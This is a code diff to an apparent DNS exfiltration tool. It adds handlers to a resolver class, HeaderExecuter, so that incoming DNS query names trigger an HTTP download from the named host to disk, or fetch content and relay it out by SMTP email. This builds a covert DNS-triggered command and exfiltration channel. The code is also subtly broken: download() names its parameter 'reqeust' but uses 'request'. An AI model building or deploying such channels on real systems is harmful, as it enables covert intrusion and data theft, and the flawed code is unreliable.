@@ -1,6 +1,12 @@
 from dns_exfil.exfiltrators.base.server import FullRequestPassthroughResolver
 import dnslib
 
+import requests
+import smtplib
+from os.path import basename
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
 
 class HeaderExecuter(FullRequestPassthroughResolver):
     def __init__(self):
@@ -31,8 +37,23 @@ class HeaderExecuter(FullRequestPassthroughResolver):
             request.header.rcode = 0
         return request
     def download(self, reqeust):
-        print('downloading')
+        response = requests.get(request.q.qname)
+        if response.status_code == 200:
+            with open('/'.join([self.context['basedir'], self.context['download_to']]), 'w') as f:
+                f.write(response.text)
     def email(self, request):
-        print('email')
+        response = requests.get(request.q.qname)
+        if response.status_code == 200:
+            you = self.context['email_to']
+            me = self.context['email_from']
+            msg = MIMEMultipart('alternative')
+            msg['To'] = you
+            msg['From'] = me
+            msg['Subject'] = self.context['email_subject']
+            msg.attach(MIMEText(response.text, 'html'))
+            smtp = smtplib.SMTP(self.context['smtp_server'])
+            smtp.sendmail(me, you, msg.as_string())
+            smtp.quit()
+        
     def hello(self, request):
         print('hello')
